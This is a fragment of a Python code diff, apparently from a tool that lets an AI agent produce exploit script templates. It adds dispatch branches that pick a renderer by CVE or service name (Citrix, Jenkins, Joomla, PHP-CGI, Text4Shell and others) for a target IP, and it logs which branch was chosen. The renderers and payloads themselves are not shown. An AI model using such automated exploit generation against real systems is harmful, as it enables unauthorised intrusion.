+        elif cve_lower == "cve-2023-3519" or svc.lower() == "citrix":
+            _renderer = _render_citrix_template
+        elif cve_lower == "cve-2024-0204" or svc.lower() == "connectwise":
+            _renderer = _render_connectwise_template
+        elif cve_lower == "cve-2024-23897" or svc.lower() == "jenkins":
+            _renderer = _render_jenkins_template
+        elif cve_lower == "cve-2023-23752" or svc.lower() == "joomla":
+            _renderer = _render_joomla_template
+        elif cve_lower == "cve-2022-42889" or svc.lower() == "commons_text":
+            _renderer = _render_text4shell_template
+        elif cve_lower == "cve-2024-4577" or svc.lower() == "php_cgi":
+            _renderer = _render_php_cgi_template
+        elif cve_lower == "cve-2023-44487":
+            _renderer = _render_http2_rapid_reset_template
+        exploit_body = _renderer(target_ip, port_hint, svc, ver, cve)
+
+        # Phase 4: log which dispatch branch fired so the agent can debug
+        # "why did I get the generic probe for CVE-2024-6387".
+        _dispatch_name = {
+            _render_log4j_exploit: "log4j", _render_eternalblue_template: "eternalblue",
+            _render_smbghost_template: "smbghost", _render_bluekeep_template: "bluekeep",
+            _render_regresshion_template: "regresshion", _render_xz_backdoor_template: "xz_backdoor",
+            _render_activemq_rce_template: "activemq", _render_confluence_template: "confluence",
+            _render_ivanti_template: "ivanti", _render_panos_template: "panos",
+            _render_citrix_template: "citrix", _render_connectwise_template: "connectwise",
+            _render_jenkins_template: "jenkins", _render_joomla_template: "joomla",
+            _render_text4shell_template: "text4shell", _render_php_cgi_template: "php_cgi",
+            _render_http2_rapid_reset_template: "http2_rapid_reset",
+        }.get(_renderer, "generic")
+        result_lines.append(f"TEMPLATE_DISPATCHED: {_dispatch_name}")
 
         result_lines.append("")
         result_lines.append("--- Exploit Script Template ---")
